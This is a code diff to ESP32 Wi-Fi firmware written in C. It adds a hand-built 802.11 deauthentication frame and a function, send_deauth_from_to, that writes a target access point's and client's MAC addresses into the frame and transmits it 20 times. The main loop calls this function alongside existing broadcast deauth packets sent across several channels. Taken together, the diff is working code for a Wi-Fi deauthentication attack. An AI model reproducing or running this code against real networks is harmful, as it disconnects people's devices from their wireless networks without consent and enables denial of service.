@@ -94,6 +94,7 @@ inline uint32_t read_register(uint32_t address) {
 void wifi_hw_start(uint32_t param_1); // call with 2 for promiscuous mode
 void ic_set_vif(uint32_t param_1, int param_2, uint32_t mac_address_ptr, uint8_t param_4, uint8_t param_5, uint32_t param_6);
 void lmacProcessTxComplete(void);
+void esp_rom_delay_us(long unsigned int param_1);
 
 
 typedef struct __attribute__((packed)) dma_list_item {
@@ -179,6 +180,17 @@ void log_dma_item(dma_list_item *item)
 extern uint8_t beacon_raw[];
 extern uint8_t deauth_packet[];
 extern uint8_t deauth_packet_2[];
+
+uint8_t custom_deauth_packet[] = {
+    0x1e, 0x0, 0xf, 0x0, 
+    0x0, 0x0, 0x0, 0x0,
+    0xc0, 0x0, 0x0, 0x0, 
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination
+    0x08, 0x16, 0x05, 0xcc, 0xC6, 0x78, // Source
+    0x08, 0x16, 0x05, 0xcc, 0xC6, 0x78, // Source
+    0xa0, 0xd0, 0x7, 0x0, 
+    0xef, 0xbe, 0xad, 0xde
+};
 
 uint8_t datarates[] = {0x01, 0x03, 0x05, 0x09, 0x0b, 0x0f, 0x11, 0x14, 0x17};
 uint8_t n_datarates = 9;
@@ -266,6 +278,7 @@ void transmit_one(uint8_t *metapacket, uint8_t index, int repeat) {
 	// TRANSMIT!
 	for(int i = 0; i < repeat; i++) {
 		write_register(MAC_TX_PLCP0_BASE, read_register(MAC_TX_PLCP0_BASE) | 0xc0000000);
+		esp_rom_delay_us(1000*10);
 	}
 	// write_register(MAC_TX_PLCP0_BASE, read_register(MAC_TX_PLCP0_BASE) | 0xc0000000);
 	ESP_LOGW(TAG, "packet should have been sent");
@@ -578,6 +591,19 @@ void print_couple_ap_sta(const void *data)
 	ESP_LOGI(TAG, "MAC: %02x:%02x:%02x:%02x:%02x:%02x", couple->dev.mac[0], couple->dev.mac[1], couple->dev.mac[2], couple->dev.mac[3], couple->dev.mac[4], couple->dev.mac[5]);
 }
 
+void send_deauth_from_to(const void *data)
+{
+	const CoupleAP_DEV *couple = (const CoupleAP_DEV *)data;
+	const uint8_t *ap_mac = couple->ap.mac;
+	const uint8_t *dev_mac = couple->dev.mac;
+	// Use custom deauth packet, substitute the MAC addresses
+	memcpy(custom_deauth_packet + 12, dev_mac, 6);
+	memcpy(custom_deauth_packet + 18, ap_mac, 6);
+	memcpy(custom_deauth_packet + 24, ap_mac, 6);
+	// Send the packet
+	transmit_one(custom_deauth_packet, 0, 20);
+}
+
 void wifi_hardware_task(hardware_mac_args *pvParameter) 
 {
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
@@ -685,7 +711,7 @@ void wifi_hardware_task(hardware_mac_args *pvParameter)
 	while(true)
 	{
 
-		int next_index = (counter+1) % n_less_frequencies; // +1 is to start from the 0th element intead of the (n-1)th
+		int next_index = (counter) % n_less_frequencies;
 		int next_frequency = less_frequencies[next_index];
 		ESP_LOGI(TAG, "Switching to frequency 0x%08x", next_frequency);
 		// Set the frequency
@@ -699,6 +725,8 @@ void wifi_hardware_task(hardware_mac_args *pvParameter)
 			transmit_one(deauth_packet_2, 0, 20);
 			vTaskDelay(200 / portTICK_PERIOD_MS);
 		}
+
+		simulation(send_deauth_from_to);
 
 		// Listen for 10 seconds and transmit again
 		uint64_t start_time = esp_timer_get_time();
